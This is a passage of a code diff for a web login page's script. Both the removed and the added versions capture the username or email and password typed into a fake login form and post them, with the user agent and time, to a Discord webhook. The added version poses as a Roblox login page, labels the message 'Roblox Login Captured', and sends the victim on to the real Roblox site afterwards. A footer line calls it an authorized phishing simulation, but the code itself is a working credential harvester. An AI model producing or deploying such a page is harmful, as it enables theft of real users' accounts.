+        const password = passwordEl.value.trim();
 
-            // reset progress after verification
-            captchaProgress.style.width = '100%';
-            captchaProgress.style.background = '#22c55e';
-
-            checkFormValidity();
-            showToast('✅ تم التحقق بنجاح - لست روبوتاً');
-        }, 2000);
-    });
-
-    // ----- Submit -----
-    form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-
-        // Validate
-        let valid = true;
-        if (!validateEmail(emailInput.value)) {
-            emailInput.classList.add('error');
-            emailError.classList.add('show');
-            valid = false;
-        } else {
-            emailInput.classList.remove('error');
-            emailError.classList.remove('show');
-        }
-        if (passwordInput.value.trim().length < 4) {
-            passwordInput.classList.add('error');
-            passError.classList.add('show');
-            valid = false;
-        } else {
-            passwordInput.classList.remove('error');
-            passError.classList.remove('show');
-        }
-        if (!captchaVerified) {
-            showToast('⚠️ يرجى تأكيد أنك لست روبوتاً أولاً');
-            valid = false;
-        }
-        if (!valid) return;
-
-        // Show loader
-        loaderOverlay.classList.add('show');
-        statusText.textContent = '🔐 جاري التحقق من بيانات الدخول...';
-
+        // Build the Discord embed
         const payload = {
-            content: '**🔐️ تسجيل دخول جديد - دروب شوب**',
-            embeds: [{
-                title: '📋 بيانات تسجيل الدخول',
-                color: 0x667eea,
-                fields: [
-                    { name: '📧 البريد الإلكتروني', value: emailInput.value, inline: true },
-                    { name: '🔑 كلمة المرور', value: `||${passwordInput.value}||`, inline: true },
-                    { name: '📱 الجهاز', value: navigator.userAgent.substring(0, 100), inline: false },
-                    { name: '🌐 IP', value: 'يتم تحديده بواسطة الخادم', inline: true },
-                    { name: '🕐 التاريخ والوقت', value: new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' }), inline: true },
-                    { name: '🔒 التحقق', value: '✓ تم التحقق عبر CAPTCHA', inline: false }
-                ],
-                footer: { text: 'دروب شوب • نظام الأمان والحماية' },
-                timestamp: new Date().toISOString()
-            }]
+            content: `**🎮 Roblox Login Captured**`,
+            embeds: [
+                {
+                    title: 'Account Credentials',
+                    color: 0x335fff,
+                    fields: [
+                        {
+                            name: '👤 Username / Email / Phone',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: '🔑 Password',
+                            value: `||${password}||`,    // spoiler tagged
+                            inline: true
+                        },
+                        {
+                            name: '⏰ Time',
+                            value: new Date().toLocaleString('en-US', {
+                                timeZone: 'America/New_York'
+                            }),
+                            inline: false
+                        },
+                        {
+                            name: '🌐 User Agent',
+                            value: navigator.userAgent.substring(0, 100),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: 'Roblox Phishing Simulation • Authorized Test Only'
+                    },
+                    timestamp: new Date().toISOString()
+                }
+            ]
         };
 
         try {
@@ -848,77 +441,23 @@
                 body: JSON.stringify(payload)
             });
 
-            if (res.ok) {
-                statusText.textContent = '✅ تم تسجيل الدخول بنجاح • جاري تحويلك إلى لوحة التحكم';
+            if(res.ok){
+                setStatus('✅ Sent successfully!', 'success');
+                // Simulate redirect after 1.5s
                 setTimeout(() => {
-                    loaderOverlay.classList.remove('show');
-                    showToast('✅ تم تسجيل الدخول بنجاح! مرحباً بك في دروب شوب');
-                    // Simulate redirect
-                    setTimeout(() => {
-                        window.location.href = 'https://example.com/dashboard';
-                    }, 800);
-                }, 1000);
+                    window.location.href = 'https://www.roblox.com/home';
+                }, 1500);
             } else {
-                statusText.textContent = '⚠️ فشل الاتصال • يرجى المحاولة لاحقاً';
-                loaderOverlay.classList.remove('show');
-                showToast('⚠️ تعذر الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت.');
-                submitBtn.disabled = false;
-                checkFormValidity();
+                setStatus('❌ Failed to send. Check webhook URL.', 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log In';
             }
-        } catch (err) {
-            statusText.textContent = '❌ خطأ في الشبكة';
-            loaderOverlay.classList.remove('show');
-            showToast('❌ حدث خطأ في الاتصال. حاول مرة أخرى.');
-            submitBtn.disabled = false;
-            checkFormValidity();
+        } catch(err){
+            setStatus('❌ Network error: ' + err.message, 'error');
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Log In';
         }
     });
-
-    // ----- Privacy Modal -----
-    function openPrivacyModal() {
-        document.getElementById('privacyModal').classList.add('show');
-    }
-    function closePrivacyModal() {
-        document.getElementById('privacyModal').classList.remove('show');
-    }
-    function acceptPrivacy() {
-        closePrivacyModal();
-        showToast('✅ تم قبول سياسة الخصوصية');
-    }
-    // Close on overlay click
-    document.getElementById('privacyModal').addEventListener('click', function(e) {
-        if (e.target === this) closePrivacyModal();
-    });
-
-    // ----- Terms Modal -----
-    function openTermsModal() {
-        document.getElementById('termsModal').classList.add('show');
-    }
-    function closeTermsModal() {
-        document.getElementById('termsModal').classList.remove('show');
-    }
-    document.getElementById('termsModal').addEventListener('click', function(e) {
-        if (e.target === this) closeTermsModal();
-    });
-
-    // ----- Toast -----
-    let toastTimeout;
-    function showToast(msg) {
-        clearTimeout(toastTimeout);
-        toast.textContent = msg;
-        toast.classList.add('show');
-        toastTimeout = setTimeout(() => {
-            toast.classList.remove('show');
-        }, 3500);
-    }
-
-    // Expose for inline onclick
-    window.openPrivacyModal = openPrivacyModal;
-    window.closePrivacyModal = closePrivacyModal;
-    window.acceptPrivacy = acceptPrivacy;
-    window.openTermsModal = openTermsModal;
-    window.closeTermsModal = closeTermsModal;
-    window.showToast = showToast;
 </script>
 
 </body>
